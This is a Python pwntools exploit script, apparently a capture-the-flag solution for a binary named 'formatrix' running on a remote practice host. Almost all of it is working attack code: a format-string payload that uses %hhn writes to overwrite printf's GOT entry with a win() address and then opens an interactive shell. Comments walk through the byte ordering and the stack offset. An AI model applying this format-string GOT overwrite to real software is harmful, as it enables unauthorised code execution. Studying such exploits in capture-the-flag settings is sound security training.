from pwn import *
import re

p = process("./formatrix")
p = remote('plsdonthaq.me', 4003)

# fgets(ebp-0x208, 0x200, stdin)
# sprintf(ebp-0x608, ep-0x208)

# There is a win() function which will pop our shell
# Either overwrite puts, or printf.  
# However, the win function also uses puts, so we don't want to cause an infinite loop.
# Override printf!

printf_GOT = 0x8049c18 # From the ELF

""" Time for some quick maffs

Win Address = 0x8048536 (From the ELF)

We're going to inject the values one byte at a time.  
To do, we'll need to start the string with the four addresses of each byte for the printf GOT.  

0x08 -> addr+3
0x04 -> addr+2
0x85 -> addr+1
0x36 -> addr+0

Due to needing to include the addresses, %n write will start of as >= 16.  
We'll start at 0x36, then go to 0x85, then overflow to 0x04, then go to 0x08

0x36 -> addr+0
0x85 -> addr+1
0x04 -> addr+2
0x08 -> addr+3

# Oh hey it's just reverse order!
"""

'''
payload = b"AAAA"+ b" %p" * 10
AAAA 0xf77885a0 0x804858c 0x41414141 0x66783020 0x38383737 0x20306135 0x30387830 0x38353834 0x78302063 0x31343134

We can read our string at the third 4-byte index i.e. %3$p
'''

payload = b""
payload += p32(printf_GOT+0)
payload += p32(printf_GOT+1)
payload += p32(printf_GOT+2)
payload += p32(printf_GOT+3)

payload += b"." * (0x36 - len(payload))
payload += b'%3$hhn'

payload += b"." * (0x85 - 0x36)
payload += b'%4$hhn'

payload += b"." * ((0x04 - 0x85) & 0xFF)
payload += b'%5$hhn'

payload += b"." * (0x08 - 0x04)
payload += b'%6$hhn'

print(f"Payload is {len(payload)} bytes long")

p.sendline(payload)
p.interactive()